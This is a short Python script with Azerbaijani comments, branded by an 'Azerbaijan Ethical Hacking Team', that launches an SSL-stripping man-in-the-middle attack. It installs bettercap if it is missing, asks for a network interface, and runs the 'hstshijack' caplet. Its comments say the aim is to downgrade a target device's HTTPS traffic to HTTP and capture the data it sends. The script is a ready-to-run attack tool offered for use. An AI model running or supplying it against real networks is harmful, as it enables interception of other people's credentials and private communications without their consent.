# Azərbaycan dilində intefeysi olan alət.
# HTTPS BYPASS O.G.A aləti işə salınıdqdan sonra
# Hədəf qurğunun HTTPS ötürmələrini HTTP protokolu ilə əvəzləyir,
# hədəf qurğunun ötürdüyü məlumatları əldə etmək imkanı yaradır.
# Hazırladı Orxan Bayramov.
# Yazılım dili Python 3
# 2021-ci il https://www.kht.az
# !/usr/bin/env python

import subprocess

import netifaces


def printbanner():
    subprocess.call(["clear"])
    print("██   ██ ██   ██  █████   ██████   █████  ███    ██    AZERBAIJAN")
    print("██  ██  ██   ██ ██   ██ ██       ██   ██ ████   ██      ETHICAL ")
    print("█████   ███████ ███████ ██   ███ ███████ ██ ██  ██      HACKING ")
    print("██  ██  ██   ██ ██   ██ ██    ██ ██   ██ ██  ██ ██       TEAM")
    print("██   ██ ██   ██ ██   ██  ██████  ██   ██ ██   ████  https://kht.az\n")
    print("  HTTPS bağlantıda SSL-TLS şıfrələnmənin ləğvi      HTTPS BYPASS")
    print("---------------------------------------------------------------------")


print(" [*] Çıxış üçün CTRL + C")


def bettercap_control():
    rc = subprocess.call(['which', 'bettercap'])
    if rc == 0:
        pass
    else:
        print(" [*] bettercap yyüklənir....")
        subprocess.call(["sudo", "apt", "install", "bettercap", "-y"])


def start_bypass():
    interface_list = netifaces.interfaces()
    interface_list.remove("lo")
    print(" [+]  Şəbəkə intefeysini seçin.\n")
    print(*interface_list, end="\n\n")
    interface = input(" [*] İnterfeys > ")
    subprocess.call(["sudo", "bettercap", "-iface", interface, "-caplet", "hstshijack/hstshijack"])


printbanner()
start_bypass()
